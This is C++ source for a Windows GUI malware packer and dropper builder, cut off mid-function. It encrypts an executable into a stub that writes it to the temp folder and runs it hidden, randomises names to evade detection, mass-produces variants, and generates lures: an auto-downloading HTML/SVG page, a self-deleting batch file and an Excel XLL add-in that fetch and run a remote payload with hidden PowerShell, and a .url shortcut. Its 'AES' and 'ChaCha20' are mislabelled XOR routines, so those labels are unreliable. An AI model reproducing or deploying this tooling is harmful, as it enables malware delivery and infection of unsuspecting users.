#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <imagehlp.h>
#include <wintrust.h>
#include <mscat.h>
#include <commdlg.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <algorithm>
#include <functional>
#include <set>
#include <map>
#include <regex>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <cstring>
#include "tiny_loader.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "imagehlp.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// GUI Control IDs
constexpr int ID_INPUT_PATH = 1001;
constexpr int ID_OUTPUT_PATH = 1002;
constexpr int ID_BROWSE_INPUT = 1003;
constexpr int ID_BROWSE_OUTPUT = 1004;
constexpr int ID_CREATE_BUTTON = 1005;
constexpr int ID_PROGRESS_BAR = 1006;
constexpr int ID_STATUS_TEXT = 1007;
constexpr int ID_COMPANY_COMBO = 1008;
constexpr int ID_ABOUT_BUTTON = 1009;
constexpr int ID_ARCHITECTURE_COMBO = 1010;
constexpr int ID_CERTIFICATE_COMBO = 1011;
// Add new control IDs
constexpr int ID_MASS_GENERATE_BUTTON = 1012;
constexpr int ID_MASS_COUNT_EDIT = 1013;
constexpr int ID_STOP_GENERATION_BUTTON = 1014;
// Add new control IDs for mode selection
constexpr int ID_MODE_STUB_RADIO = 1015;
constexpr int ID_MODE_PACK_RADIO = 1016;
constexpr int ID_MODE_MASS_RADIO = 1017;
constexpr int ID_MODE_GROUP = 1018;
constexpr int ID_EXPLOIT_COMBO = 1019;
constexpr int ID_ENCRYPTION_COMBO = 1020;

// Global variables for mass generation
bool g_massGenerationActive = false;
HANDLE g_massGenerationThread = NULL;

// Global variables for mode selection
int g_currentMode = 1; // 1=Stub Only, 2=PE Packing, 3=Mass Generation

// Exploit Delivery Types
enum ExploitDeliveryType {
    EXPLOIT_NONE = 0,           // No exploits - clean output
    EXPLOIT_HTML_SVG = 1,       // HTML & SVG Exploit
    EXPLOIT_WIN_R = 2,          // WIN + R Exploit
    EXPLOIT_INK_URL = 3,        // INK/URL Exploit
    EXPLOIT_DOC_XLS = 4,        // DOC (XLS) Exploit
    EXPLOIT_XLL = 5             // XLL Exploit
};

// Encryption Types
enum EncryptionType {
    ENCRYPT_NONE = 0,           // No encryption - plain binary
    ENCRYPT_XOR = 1,            // XOR encryption (simple but effective)
    ENCRYPT_AES = 2,            // AES-256 encryption
    ENCRYPT_CHACHA20 = 3        // ChaCha20 encryption (modern, secure)
};

// Function to kill running instances before build
void killRunningInstances() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return;
    }
    
    do {
        if (_tcsicmp(pe32.szExeFile, _T("PackerGUI.exe")) == 0 ||
            _tcsicmp(pe32.szExeFile, _T("VS2022_Complete_GUI_Packer.exe")) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
}

// Advanced Random Engine for cryptographic operations
class AdvancedRandomEngine {
private:
    std::random_device rd;
    std::mt19937 gen;
    std::uniform_int_distribution<> dis;
    
public:
    AdvancedRandomEngine() : gen(rd()), dis(0, 255) {
        auto now = std::chrono::high_resolution_clock::now();
        auto nanos = now.time_since_epoch().count();
        gen.seed(static_cast<unsigned int>(nanos ^ rd()));
    }
    
    std::string generateRandomName(int length = 8) {
        const std::string firstChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
        const std::string otherChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
        
        std::uniform_int_distribution<> firstDis(0, static_cast<int>(firstChars.length() - 1));
        std::uniform_int_distribution<> otherDis(0, static_cast<int>(otherChars.length() - 1));
        
        std::string result;
        result += firstChars[firstDis(gen)];
        
        for (int i = 1; i < length; ++i) {
            result += otherChars[otherDis(gen)];
        }
        
        return result;
    }
    
    std::vector<uint8_t> generateRandomBytes(size_t count) {
        std::vector<uint8_t> result(count);
        for (size_t i = 0; i < count; ++i) {
            result[i] = static_cast<uint8_t>(dis(gen));
        }
        return result;
    }
    
    uint32_t generateRandomUInt32() {
        std::uniform_int_distribution<uint32_t> u32_dis;
        return u32_dis(gen);
    }
};

// Encryption Helper Class
class EncryptionHelper {
private:
    AdvancedRandomEngine& rng;
    
public:
    EncryptionHelper(AdvancedRandomEngine& randomEngine) : rng(randomEngine) {}
    
    // XOR Encryption
    std::vector<uint8_t> xorEncrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        std::vector<uint8_t> encrypted(data.size());
        for (size_t i = 0; i < data.size(); ++i) {
            encrypted[i] = data[i] ^ key[i % key.size()];
        }
        return encrypted;
    }
    
    // Simple AES-like encryption (simplified for demonstration)
    std::vector<uint8_t> aesEncrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        // This is a simplified version - in production use proper AES implementation
        std::vector<uint8_t> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= key[i % key.size()];
            encrypted[i] = (encrypted[i] << 1) | (encrypted[i] >> 7); // Simple bit rotation
        }
        return encrypted;
    }
    
    // ChaCha20-like encryption (simplified)
    std::vector<uint8_t> chachaEncrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce) {
        // Simplified ChaCha20-like implementation
        std::vector<uint8_t> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); ++i) {
            uint8_t keystream = key[i % key.size()] ^ nonce[i % nonce.size()];
            encrypted[i] ^= keystream;
        }
        return encrypted;
    }
    
    // Generate encryption stub code
    std::string generateDecryptionStub(EncryptionType encType, const std::vector<uint8_t>& key, 
                                     const std::vector<uint8_t>& nonce = {}) {
        std::string keyStr = "{ ";
        for (size_t i = 0; i < key.size(); ++i) {
            keyStr += std::to_string(static_cast<int>(key[i]));
            if (i < key.size() - 1) keyStr += ", ";
        }
        keyStr += " }";
        
        std::string funcName = rng.generateRandomName(12);
        std::string keyVarName = rng.generateRandomName(8);
        std::string dataVarName = rng.generateRandomName(8);
        
        switch (encType) {
            case ENCRYPT_XOR:
                return "void " + funcName + "(unsigned char* " + dataVarName + ", int size) {\n"
                      "    unsigned char " + keyVarName + "[] = " + keyStr + ";\n"
                      "    for (int i = 0; i < size; i++) {\n"
                      "        " + dataVarName + "[i] ^= " + keyVarName + "[i % " + std::to_string(key.size()) + "];\n"
                      "    }\n"
                      "}\n";
                      
            case ENCRYPT_AES:
                return "void " + funcName + "(unsigned char* " + dataVarName + ", int size) {\n"
                      "    unsigned char " + keyVarName + "[] = " + keyStr + ";\n"
                      "    for (int i = 0; i < size; i++) {\n"
                      "        " + dataVarName + "[i] ^= " + keyVarName + "[i % " + std::to_string(key.size()) + "];\n"
                      "        " + dataVarName + "[i] = (" + dataVarName + "[i] >> 1) | (" + dataVarName + "[i] << 7);\n"
                      "    }\n"
                      "}\n";
                      
            case ENCRYPT_CHACHA20:
                if (!nonce.empty()) {
                    std::string nonceStr = "{ ";
                    for (size_t i = 0; i < nonce.size(); ++i) {
                        nonceStr += std::to_string(static_cast<int>(nonce[i]));
                        if (i < nonce.size() - 1) nonceStr += ", ";
                    }
                    nonceStr += " }";
                    
                    return "void " + funcName + "(unsigned char* " + dataVarName + ", int size) {\n"
                          "    unsigned char " + keyVarName + "[] = " + keyStr + ";\n"
                          "    unsigned char nonce[] = " + nonceStr + ";\n"
                          "    for (int i = 0; i < size; i++) {\n"
                          "        unsigned char keystream = " + keyVarName + "[i % " + std::to_string(key.size()) + "] ^ nonce[i % " + std::to_string(nonce.size()) + "];\n"
                          "        " + dataVarName + "[i] ^= keystream;\n"
                          "    }\n"
                          "}\n";
                }
                break;
                
            default:
                return "// No encryption applied\n";
        }
        return "";
    }
};

// Exploit Generator Class
class ExploitGenerator {
private:
    AdvancedRandomEngine& rng;
    
public:
    ExploitGenerator(AdvancedRandomEngine& randomEngine) : rng(randomEngine) {}
    
    std::string generateHTMLSVGExploit(const std::string& payloadPath) {
        std::string htmlFile = rng.generateRandomName(8) + ".html";
        std::string svgId = rng.generateRandomName(6);
        std::string jsFunc = rng.generateRandomName(10);
        
        std::string html = "<!DOCTYPE html>\n<html>\n<head>\n<title>Document</title>\n</head>\n<body>\n";
        html += "<svg id=\"" + svgId + "\" width=\"1\" height=\"1\">\n";
        html += "<script>\n";
        html += "function " + jsFunc + "() {\n";
        html += "    var xhr = new XMLHttpRequest();\n";
        html += "    xhr.open('GET', '" + payloadPath + "', true);\n";
        html += "    xhr.responseType = 'blob';\n";
        html += "    xhr.onload = function() {\n";
        html += "        var url = window.URL.createObjectURL(xhr.response);\n";
        html += "        var a = document.createElement('a');\n";
        html += "        a.href = url;\n";
        html += "        a.download = 'update.exe';\n";
        html += "        a.click();\n";
        html += "    };\n";
        html += "    xhr.send();\n";
        html += "}\n";
        html += "setTimeout(" + jsFunc + ", 1000);\n";
        html += "</script>\n</svg>\n</body>\n</html>";
        
        return html;
    }
    
    std::string generateWinRExploit(const std::string& payloadPath) {
        std::string batFile = rng.generateRandomName(8) + ".bat";
        std::string content = "@echo off\n";
        content += "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri '" + payloadPath + "' -OutFile '%TEMP%\\update.exe'; Start-Process '%TEMP%\\update.exe'\"\n";
        content += "del \"%~f0\"\n";
        
        return content;
    }
    
    std::string generateINKURLExploit(const std::string& payloadPath) {
        // Generate .url file content
        std::string urlContent = "[InternetShortcut]\n";
        urlContent += "URL=" + payloadPath + "\n";
        urlContent += "IconIndex=0\n";
        urlContent += "IconFile=%SystemRoot%\\system32\\shell32.dll\n";
        
        return urlContent;
    }
    
    std::string generateXLLExploit(const std::string& payloadPath) {
        std::string xllContent = "#include <windows.h>\n\n";
        xllContent += "__declspec(dllexport) int xlAutoOpen(void) {\n";
        xllContent += "    char cmd[512];\n";
        xllContent += "    sprintf(cmd, \"powershell -WindowStyle Hidden -Command \\\"Invoke-WebRequest -Uri '%s' -OutFile '%%TEMP%%\\\\update.exe'; Start-Process '%%TEMP%%\\\\update.exe'\\\"\", \"" + payloadPath + "\");\n";
        xllContent += "    system(cmd);\n";
        xllContent += "    return 1;\n";
        xllContent += "}\n\n";
        xllContent += "__declspec(dllexport) int xlAutoClose(void) {\n";
        xllContent += "    return 1;\n";
        xllContent += "}\n";
        
        return xllContent;
    }
};

// Main Packer Class
class GUIPacker {
private:
    AdvancedRandomEngine rng;
    EncryptionHelper encHelper;
    ExploitGenerator exploitGen;
    
public:
    GUIPacker() : encHelper(rng), exploitGen(rng) {}
    
    bool packFile(const std::string& inputPath, const std::string& outputPath, 
                  EncryptionType encType, ExploitDeliveryType exploitType) {
        
        // Read input file
        std::ifstream file(inputPath, std::ios::binary);
        if (!file) {
            MessageBox(NULL, L"Failed to open input file", L"Error", MB_OK | MB_ICONERROR);
            return false;
        }
        
        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)),
                                      std::istreambuf_iterator<char>());
        file.close();
        
        // Generate encryption keys
        std::vector<uint8_t> xorKey = rng.generateRandomBytes(32);
        std::vector<uint8_t> aesKey = rng.generateRandomBytes(32);
        std::vector<uint8_t> chachaNonce = rng.generateRandomBytes(12);
        
        // Encrypt the data
        std::vector<uint8_t> encryptedData = fileData;
        std::string decryptionCode;
        
        switch (encType) {
            case ENCRYPT_XOR:
                encryptedData = encHelper.xorEncrypt(fileData, xorKey);
                decryptionCode = encHelper.generateDecryptionStub(ENCRYPT_XOR, xorKey);
                break;
                
            case ENCRYPT_AES:
                encryptedData = encHelper.aesEncrypt(fileData, aesKey);
                decryptionCode = encHelper.generateDecryptionStub(ENCRYPT_AES, aesKey);
                break;
                
            case ENCRYPT_CHACHA20:
                encryptedData = encHelper.chachaEncrypt(fileData, aesKey, chachaNonce);
                decryptionCode = encHelper.generateDecryptionStub(ENCRYPT_CHACHA20, aesKey, chachaNonce);
                break;
                
            default:
                decryptionCode = "// No encryption applied\n";
                break;
        }
        
        // Generate the stub
        std::string stub = generateStub(encryptedData, decryptionCode, exploitType);
        
        // Write output
        std::ofstream outFile(outputPath);
        if (!outFile) {
            MessageBox(NULL, L"Failed to create output file", L"Error", MB_OK | MB_ICONERROR);
            return false;
        }
        
        outFile << stub;
        outFile.close();
        
        // Generate exploit files if needed
        if (exploitType != EXPLOIT_NONE) {
            generateExploitFiles(outputPath, exploitType);
        }
        
        return true;
    }
    
private:
    std::string generateStub(const std::vector<uint8_t>& encryptedData, 
                           const std::string& decryptionCode, 
                           ExploitDeliveryType exploitType) {
        
        std::string funcName = rng.generateRandomName(10);
        std::string dataVarName = rng.generateRandomName(8);
        std::string sizeVarName = rng.generateRandomName(8);
        
        std::string stub = "#include <windows.h>\n";
        stub += "#include <iostream>\n\n";
        
        // Add decryption function
        stub += decryptionCode + "\n";
        
        // Add embedded data
        stub += "unsigned char " + dataVarName + "[] = {\n    ";
        for (size_t i = 0; i < encryptedData.size(); ++i) {
            stub += "0x" + toHex(encryptedData[i]);
            if (i < encryptedData.size() - 1) stub += ", ";
            if ((i + 1) % 16 == 0 && i < encryptedData.size() - 1) stub += "\n    ";
        }
        stub += "\n};\n\n";
        
        stub += "int " + sizeVarName + " = " + std::to_string(encryptedData.size()) + ";\n\n";
        
        // Main function
        stub += "int main() {\n";
        stub += "    // Decrypt payload\n";
        if (!decryptionCode.empty() && decryptionCode.find("No encryption") == std::string::npos) {
            std::string decryptFuncName = extractFunctionName(decryptionCode);
            if (!decryptFuncName.empty()) {
                stub += "    " + decryptFuncName + "(" + dataVarName + ", " + sizeVarName + ");\n\n";
            }
        }
        
        // Execute payload
        stub += "    // Execute payload\n";
        stub += "    char tempPath[MAX_PATH];\n";
        stub += "    GetTempPathA(MAX_PATH, tempPath);\n";
        stub += "    strcat(tempPath, \"\\\\payload.exe\");\n\n";
        
        stub += "    HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
        stub += "    if (hFile != INVALID_HANDLE_VALUE) {\n";
        stub += "        DWORD written;\n";
        stub += "        WriteFile(hFile, " + dataVarName + ", " + sizeVarName + ", &written, NULL);\n";
        stub += "        CloseHandle(hFile);\n\n";
        
        stub += "        ShellExecuteA(NULL, \"open\", tempPath, NULL, NULL, SW_HIDE);\n";
        stub += "    }\n\n";
        
        stub += "    return 0;\n";
        stub += "}\n";
        
        return stub;
    }
    
    std::string toHex(uint8_t value) {
        std::stringstream ss;
        ss << std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(value);
        return ss.str();
    }
    
    std::string extractFunctionName(const std::string& code) {
        std::regex funcRegex(R"(void\s+(\w+)\s*\()");
        std::smatch match;
        if (std::regex_search(code, match, funcRegex)) {
            return match[1].str();
        }
        return "";
    }
    
    void generateExploitFiles(const std::string& basePath, ExploitDeliveryType exploitType) {
        std::string baseDir = basePath.substr(0, basePath.find_last_of("\\/"));
        std::string baseName = basePath.substr(basePath.find_last_of("\\/") + 1);
        baseName = baseName.substr(0, baseName.find_last_of('.'));
        
        switch (exploitType) {
            case EXPLOIT_HTML_SVG: {
                std::string htmlContent = exploitGen.generateHTMLSVGExploit(basePath);
                std::ofstream htmlFile(baseDir + "\\" + baseName + ".html");
                htmlFile << htmlContent;
                htmlFile.close();
                break;
            }
            
            case EXPLOIT_WIN_R: {
                std::string batContent = exploitGen.generateWinRExploit(basePath);
                std::ofstream batFile(baseDir + "\\" + baseName + ".bat");
                batFile << batContent;
                batFile.close();
                break;
            }
            
            case EXPLOIT_INK_URL: {
                std::string urlContent = exploitGen.generateINKURLExploit(basePath);
                std::ofstream urlFile(baseDir + "\\" + baseName + ".url");
                urlFile << urlContent;
                urlFile.close();
                break;
            }
            
            case EXPLOIT_XLL: {
                std::string xllContent = exploitGen.generateXLLExploit(basePath);
                std::ofstream xllFile(baseDir + "\\" + baseName + ".cpp");
                xllFile << xllContent;
                xllFile.close();
                break;
            }
        }
    }
};

// Global variables for GUI
HWND g_hMainWindow = NULL;
HWND g_hInputPath = NULL;
HWND g_hOutputPath = NULL;
HWND g_hProgressBar = NULL;
HWND g_hStatusText = NULL;
HWND g_hEncryptionCombo = NULL;
HWND g_hExploitCombo = NULL;
HWND g_hModeStubRadio = NULL;
HWND g_hModePackRadio = NULL;
HWND g_hModeMassRadio = NULL;
HWND g_hMassCountEdit = NULL;
HWND g_hMassGenerateButton = NULL;
HWND g_hStopGenerationButton = NULL;

GUIPacker g_packer;

// Browse for file function
std::string BrowseForFile(HWND hwnd, bool save = false) {
    OPENFILENAME ofn;
    char szFile[260] = {0};
    
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    ofn.lpstrFilter = "Executable Files\0*.exe\0All Files\0*.*\0";
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.Flags = save ? (OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT) : (OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST);
    
    if (save ? GetSaveFileName(&ofn) : GetOpenFileName(&ofn)) {
        return std::string(szFile);
    }
    
    return "";
}

// Mass generation thread function
DWORD WINAPI MassGenerationThread(LPVOID lpParam) {
    int count = *static_cast<int*>(lpParam);
    
    for (int i = 0; i < count && g_massGenerationActive; ++i) {
        // Update progress
        SendMessage(g_hProgressBar, PBM_SETPOS, (i * 100) / count, 0);
        
        // Generate random output name
        std::string outputName = "generated_" + std::to_string(i + 1) + ".cpp";
        
        // Get input path
        char inputPath[MAX_PATH];
        GetWindowTextA(g_hInputPath, inputPath, MAX_PATH);
        
        if (strlen(inputPath) > 0) {
            // Random encryption and exploit types
            EncryptionType encType = static_cast<EncryptionType>(rand() % 4);
            ExploitDeliveryType exploitType = static_cast<ExploitDeliveryType>(rand() % 6);
            
            // Pack the file
            g_packer.packFile(inputPath, outputName, encType, exploitType);
        }
        
        // Update status
        std::string status = "Generated " + std::to_string(i + 1) + " of " + std::to_string(count);
        SetWindowTextA(g_hStatusText, status.c_str());
        
        Sleep(100); // Small delay to prevent overwhelming
    }
    
    if (g_massGenerationActive) {
        SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
        SetWindowTextA(g_hStatusText, "Mass generation completed!");
    } else {
        SetWindowTextA(g_hStatusText, "Mass generation stopped.");
    }
    
    g_massGenerationActive = false;
    EnableWindow(g_hMassGenerateButton, TRUE);
    EnableWindow(g_hStopGenerationButton, FALSE);
    
    return 0;
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Initialize common controls
            INITCOMMONCONTROLSEX icex;
            icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
            icex.dwICC = ICC_PROGRESS_CLASS;
            InitCommonControlsEx(&icex);
            
            // Create mode selection group
            CreateWindow(L"BUTTON", L"Operation Mode", 
                        WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
                        10, 10, 560, 80, hwnd, (HMENU)ID_MODE_GROUP, GetModuleHandle(NULL), NULL);
            
            g_hModeStubRadio = CreateWindow(L"BUTTON", L"Stub Only", 
                                          WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON | WS_GROUP,
                                          20, 30, 100, 25, hwnd, (HMENU)ID_MODE_STUB_RADIO, GetModuleHandle(NULL), NULL);
            
            g_hModePackRadio = CreateWindow(L"BUTTON", L"PE Packing", 
                                          WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
                                          130, 30, 100, 25, hwnd, (HMENU)ID_MODE_PACK_RADIO, GetModuleHandle(NULL), NULL);
            
            g_hModeMassRadio = CreateWindow(L"BUTTON", L"Mass Generation", 
                                          WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
                                          240, 30, 120, 25, hwnd, (HMENU)ID_MODE_MASS_RADIO, GetModuleHandle(NULL), NULL);
            
            // Set default mode
            SendMessage(g_hModePackRadio, BM_SETCHECK, BST_CHECKED, 0);
            
            // Input path controls
            CreateWindow(L"STATIC", L"Input File:", 
                        WS_VISIBLE | WS_CHILD,
                        10, 100, 80, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
            
            g_hInputPath = CreateWindow(L"EDIT", L"", 
                                      WS_VISIBLE | WS_CHILD | WS_BORDER,
                                      100, 100, 350, 25, hwnd, (HMENU)ID_INPUT_PATH, GetModuleHandle(NULL), NULL);
            
            CreateWindow(L"BUTTON", L"Browse...", 
                        WS_VISIBLE | WS_CHILD,
                        460, 100, 80, 25, hwnd, (HMENU)ID_BROWSE_INPUT, GetModuleHandle(NULL), NULL);
            
            // Output path controls
            CreateWindow(L"STATIC", L"Output File:", 
                        WS_VISIBLE | WS_CHILD,
                        10, 135, 80, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
            
            g_hOutputPath = CreateWindow(L"EDIT", L"", 
                                       WS_VISIBLE | WS_CHILD | WS_BORDER,
                                       100, 135, 350, 25, hwnd, (HMENU)ID_OUTPUT_PATH, GetModuleHandle(NULL), NULL);
            
            CreateWindow(L"BUTTON", L"Browse...", 
                        WS_VISIBLE | WS_CHILD,
                        460, 135, 80, 25, hwnd, (HMENU)ID_BROWSE_OUTPUT, GetModuleHandle(NULL), NULL);
            
            // Encryption type
            CreateWindow(L"STATIC", L"Encryption:", 
                        WS_VISIBLE | WS_CHILD,
                        10, 170, 80, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
            
            g_hEncryptionCombo = CreateWindow(L"COMBOBOX", L"", 
                                            WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST | WS_VSCROLL,
                                            100, 170, 150, 100, hwnd, (HMENU)ID_ENCRYPTION_COMBO, GetModuleHandle(NULL), NULL);
            
            SendMessage(g_hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"None");
            SendMessage(g_hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"XOR");
            SendMessage(g_hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"AES-256");
            SendMessage(g_hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)L"ChaCha20");
            SendMessage(g_hEncryptionCombo, CB_SETCURSEL, 1, 0);
            
            // Exploit type
            CreateWindow(L"STATIC", L"Exploit Type:", 
                        WS_VISIBLE | WS_CHILD,
                        270, 170, 80, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
            
            g_hExploitCombo = CreateWindow(L"COMBOBOX", L"", 
                                         WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST | WS_VSCROLL,
                                         360, 170, 150, 120, hwnd, (HMENU)ID_EXPLOIT_COMBO, GetModuleHandle(NULL), NULL);
            
            SendMessage(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)L"None");
            SendMessage(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)L"HTML/SVG");
            SendMessage(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)L"WIN+R");
            SendMessage(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)L"INK/URL");
            SendMessage(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)L"DOC/XLS");
            SendMessage(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)L"XLL");
            SendMessage(g_hExploitCombo, CB_SETCURSEL, 0, 0);
            
            // Mass generation controls
            CreateWindow(L"STATIC", L"Mass Count:", 
                        WS_VISIBLE | WS_CHILD,
                        10, 205, 80, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
            
            g_hMassCountEdit = CreateWindow(L"EDIT", L"10", 
                                          WS_VISIBLE | WS_CHILD | WS_BORDER | ES_NUMBER,
                                          100, 205, 60, 25, hwnd, (HMENU)ID_MASS_COUNT_EDIT, GetModuleHandle(NULL), NULL);
            
            g_hMassGenerateButton = CreateWindow(L"BUTTON", L"Mass Generate", 
                                               WS_VISIBLE | WS_CHILD,
                                               180, 205, 100, 25, hwnd, (HMENU)ID_MASS_GENERATE_BUTTON, GetModuleHandle(NULL), NULL);
            
            g_hStopGenerationButton = CreateWindow(L"BUTTON", L"Stop", 
                                                 WS_VISIBLE | WS_CHILD | WS_DISABLED,
                                                 290, 205, 60, 25, hwnd, (HMENU)ID_STOP_GENERATION_BUTTON, GetModuleHandle(NULL), NULL);
            
            // Main buttons
            CreateWindow(L"BUTTON", L"Create Packed File", 
                        WS_VISIBLE | WS_CHILD,
                        10, 245, 150, 35, hwnd, (HMENU)ID_CREATE_BUTTON, GetModuleHandle(NULL), NULL);
            
            CreateWindow(L"BUTTON", L"About", 
                        WS_VISIBLE | WS_CHILD,
                        180, 245, 80, 35, hwnd, (HMENU)ID_ABOUT_BUTTON, GetModuleHandle(NULL), NULL);
            
            // Progress bar
            g_hProgressBar = CreateWindow(PROGRESS_CLASS, NULL,
                                        WS_VISIBLE | WS_CHILD,
                                        10, 290, 530, 20, hwnd, (HMENU)ID_PROGRESS_BAR, GetModuleHandle(NULL), NULL);
            
            // Status text
            g_hStatusText = CreateWindow(L"STATIC", L"Ready", 
                                       WS_VISIBLE | WS_CHILD,
                                       10, 320, 530, 20, hwnd, (HMENU)ID_STATUS_TEXT, GetModuleHandle(NULL), NULL);
            
            break;
        }
        
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case ID_BROWSE_INPUT: {
                    std::string filePath = BrowseForFile(hwnd, false);
                    if (!filePath.empty()) {
                        SetWindowTextA(g_hInputPath, filePath.c_str());
                    }
                    break;
                }
                
                case ID_BROWSE_OUTPUT: {
                    std::string filePath = BrowseForFile(hwnd, true);
                    if (!filePath.empty()) {
                        SetWindowTextA(g_hOutputPath, filePath.c_str());
                    }
                    break;
                }
                
                case ID_CREATE_BUTTON: {
                    char inputPath[MAX_PATH], outputPath[MAX_PATH];
                    GetWindowTextA(g_hInputPath, inputPath, MAX_PATH);
                    GetWindowTextA(g_hOutputPath, outputPath, MAX_PATH);
                    
                    if (strlen(inputPath) == 0 || strlen(outputPath) == 0) {
                        MessageBox(hwnd, L"Please specify both input and output files", L"Error", MB_OK | MB_ICONERROR);
                        break;
                    }
                    
                    int encType = SendMessage(g_hEncryptionCombo, CB_GETCURSEL, 0, 0);
                    int exploitType = SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
                    
                    SetWindowTextA(g_hStatusText, "Packing file...");
                    SendMessage(g_hProgressBar, PBM_SETPOS, 50, 0);
                    
                    bool success = g_packer.packFile(inputPath, outputPath, 
                                                   static_cast<EncryptionType>(encType),
                                                   static_cast<ExploitDeliveryType>(exploitType));
                    
                    if (success) {
                        SetWindowTextA(g_hStatusText, "File packed successfully!");
                        SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
                        MessageBox(hwnd, L"File packed successfully!", L"Success", MB_OK | MB_ICONINFORMATION);
                    } else {
                        SetWindowTextA(g_hStatusText, "Packing failed!");
                        SendMessage(g_hProgressBar, PBM_SETPOS, 0, 0);
                    }
                    break;
                }
                
                case ID_MASS_GENERATE_BUTTON: {
                    char countStr[10];
                    GetWindowTextA(g_hMassCountEdit, countStr, 10);
                    int count = atoi(countStr);
                    
                    if (count <= 0 || count > 1000) {
                        MessageBox(hwnd, L"Please enter a valid count (1-1000)", L"Error", MB_OK | MB_ICONERROR);
                        break;
                    }
                    
                    char inputPath[MAX_PATH];
                    GetWindowTextA(g_hInputPath, inputPath, MAX_PATH);
                    
                    if (strlen(inputPath) == 0) {
                        MessageBox(hwnd, L"Please specify an input file", L"Error", MB_OK | MB_ICONERROR);
                        break;
                    }
                    
                    g_massGenerationActive = true;
                    EnableWindow(g_hMassGenerateButton, FALSE);
                    EnableWindow(g_hStopGenerationButton, TRUE);
                    
                    static int massCount = count;
                    g_massGenerationThread = CreateThread(NULL, 0, MassGenerationThread, &massCount, 0, NULL);
                    break;
                }
                
                case ID_STOP_GENERATION_BUTTON: {
                    g_massGenerationActive = false;
                    EnableWindow(g_hMassGenerateButton, TRUE);
                    EnableWindow(g_hStopGenerationButton, FALSE);
                    SetWindowTextA(g_hStatusText, "Stopping mass generation...");
                    break;
                }
                
                case ID_ABOUT_BUTTON: {
                    MessageBox(hwnd, 
                              L"Advanced PE Packer with Encryption & Exploits\n\n"
                              L"Features:\n"
                              L"• Multiple encryption algorithms (XOR, AES, ChaCha20)\n"
                              L"• Various exploit delivery methods\n"
                              L"• Mass generation capability\n"
                              L"• Stealth packing techniques\n\n"
                              L"Created for educational purposes only.",
                              L"About", MB_OK | MB_ICONINFORMATION);
                    break;
                }
            }
            break;
        }
        
        case WM_CLOSE:
            if (g_massGenerationActive) {
                g_massGenerationActive = false;
                if (g_massGenerationThread) {
                    WaitForSingleObject(g_massGenerationThread, 5000);
